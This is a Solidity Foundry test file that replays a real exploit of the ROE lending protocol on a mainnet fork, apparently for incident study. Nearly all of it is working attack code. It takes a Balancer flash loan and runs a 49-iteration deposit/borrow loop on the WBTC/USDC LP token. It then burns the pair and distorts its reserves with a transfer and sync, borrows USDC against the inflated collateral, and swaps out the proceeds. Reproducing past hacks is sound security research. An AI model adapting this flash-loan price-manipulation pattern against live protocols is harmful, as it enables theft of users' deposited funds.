// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
// @Analysis
// https://twitter.com/BlockSecTeam/status/1613267000913960976
// @TX
// https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b

interface ROE {

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

}

interface vdWBTC_USDC_LP {

    function approveDelegation(address delegatee, uint256 amount) external;

}

contract ContractTest is Test {

    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
    IUniswapV2Pair Pair = IUniswapV2Pair(0x004375Dff511095CC5A197A54140a24eFEF3A416);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    vdWBTC_USDC_LP LP = vdWBTC_USDC_LP(0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);
    IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);
    address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
    uint256 flashLoanAmount = 5_673_090_338_021;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_384_469);
        vm.label(address(roe), "ROE");
        vm.label(address(USDC), "USDC");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(Pair), "Uni-Pair");
    }

    function testExploit() external {
        vm.startPrank(address(tx.origin));
        LP.approveDelegation(address(this), type(uint256).max);
        vm.stopPrank();
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint256 borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
        USDC.approve(address(roe), type(uint256).max);
        Pair.approve(address(roe), type(uint256).max);
        roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);
        roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
        for (uint256 i; i < 49; ++i) {
            roe.deposit(address(Pair), borrowAmount, address(this), 0);
            roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
        }
        Pair.transfer(address(Pair), borrowAmount);
        Pair.burn(address(this));
        USDC.transfer(address(Pair), 26_025 * 1e6);
        Pair.sync();
        roe.borrow(address(USDC), flashLoanAmount, 2, 0, address(this));
        WBTCToUSDC();
        USDC.transfer(address(balancer), flashLoanAmount);
    }

    function WBTCToUSDC() internal {
        WBTC.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(USDC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

}
